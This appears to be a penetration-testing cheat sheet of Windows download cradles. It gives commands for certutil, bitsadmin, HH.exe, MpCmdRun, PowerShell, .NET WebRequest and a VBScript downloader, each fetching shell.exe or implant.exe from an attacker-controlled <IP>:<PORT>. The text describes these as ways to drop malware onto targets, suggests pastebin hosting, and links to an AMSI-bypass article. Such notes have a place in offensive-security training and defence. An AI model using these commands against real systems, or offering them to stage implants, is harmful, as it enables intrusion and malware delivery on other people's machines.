# Download

> [!TIP]
> You can use pastebin sites that can be used to download cradles on the targets especially if you're transferring files in the internet. Use this to your advantage user.

## 01 - Command Prompt

### 1.1 - CertUtil

```
C:\> certutil.exe -urlcache -split -f http[s]://<IP>:<PORT>/shell.exe C:\path\to\shell.exe
```

### 1.2 - Bitsadmin

```
C:\> bitsadmin /rawreturn /transfer <job_name> http[s]://<IP>:<PORT>/shell.exe C:\path\to\shell.exe

C:\> bitsadmin /create <job_name> | bitsadmin /transfer <job_name> http[s]://<IP>:<PORT>/shell.exe C:\path\to\shell.exe | bitsadmin /resume <job_name> | bitsadmin /complete <job_name>
```

### 1.3 - HH

```
C:\> HH.exe http[s]://<IP>/implant.ps1
```

### 1.4 - MpCmdRun

```
C:\> MpCmdRun.exe -DownloadFile -url http[s]://<IP>/implant.exe -path <drive_letter>:\\path\\to\implant.exe
```

## 02 - Powershell

### 2.1 - `Invoke-WebRequest`

```
PS C:\> Invoke-WebRequest -Uri http[s]://<IP>[:<PORT>]/implant.exe -OutFile implant.exe
```

### 2.2 - DownloadFile

A one-liner for downloading the dropper malware and save the disk.

```
PS C:\> (New-Object Net.WebClient).DownloadFile('http://<IP>[:<PORT>]/shell.exe', 'rsh.exe')
```

Multilines for downloading the dropper malware and save the disk.

```powershell
$storageDir = $pwd
$webclient = New-Object Net.WebClient
$url = "http[s]://<IP>:<PORT>/shell.exe"
$file = "shell.exe"
$webclient.DownloadFile($url, $file)
```

### 2.3 - Bitsadmin

```
PS C:\> Start-BitsTransfer -Source http[s]://<IP>/shell.exe -Destination C:\path\to\shell.exe
```

## 03 - DotNET Class

### 3.1 - WebRequest

```powershell
$webrequest = [System.Net.WebRequest]::Create("http[s]://<IP>:<PORT>/shell.ps1")
$response = $webrequest.GetResponse()
$responsestream = $response.GetResponseStream()
$streamreader =[System.IO.StreamReader]::new($responsestream)
$content = $streamreader.ReadToEnd()
```

## 04 - VBScript

```vbscript
C:\> type wget.vbs
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray, lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

C:\> cscript /nologo wget.vbs http[s]://<IP>:<PORT>/shell.exe shell.exe
```

---
## References

- [LOLBAS: Hh](https://lolbas-project.github.io/lolbas/Binaries/Hh/#execute)

- [LOLBAS: MpCmdRun](https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/)

- [Hacking Articles: Windows for Pentester Bitsadmin](https://www.hackingarticles.in/windows-for-pentester-bitsadmin/)

- [SS64 Powershell Get-BitsTransfer](https://ss64.com/ps/get-bitstransfer.html)

- [How to Bypass AMSI with an Unconventional Powershell Cradle](https://medium.com/@gamer.skullie/bypassing-amsi-with-an-unconventional-powershell-cradle-6bd15a17d8b9)

- [HTTP.sys web server implementation in ASP.NET Core](https://docs.microsoft.com/en-us/aspnet/core/fundamentals/servers/httpsys?view=aspnetcore-6.0)

- [Encryption and Decryption of Hex2Bin and Base64 Using Certutil](https://developpaper.com/encryption-and-decryption-of-hex2bin-and-base64-using-certutil/)

- [Sushant747 Transferring Files to Windows](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)

- [SS64 Forum Topic: Decode/Encode BASE64/HEX strings. Print symbols by HEX code.](https://ss64.org/viewtopic.php?t=99)

- [Windows File Downloads](https://notes.benheater.com/books/file-transfers-and-data-exfiltration/page/windows-file-downloads)